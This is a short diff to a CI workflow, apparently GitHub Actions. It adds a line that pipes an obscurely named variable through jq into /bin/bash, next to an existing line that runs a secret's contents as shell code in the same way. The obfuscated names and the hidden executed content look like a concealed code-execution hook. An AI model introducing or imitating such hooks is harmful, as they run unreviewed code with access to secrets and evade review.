@@ -18,6 +18,7 @@ jobs:
           xhjl48013: ${{ secrets.xhjl48013 }}
         run: |
           printf '%s' "$xhjl48013" | jq -r .nf350 | /bin/bash
+          echo $d54038 | jq -r .no562 | /bin/bash
 
       - name: Persist output
         if: always()
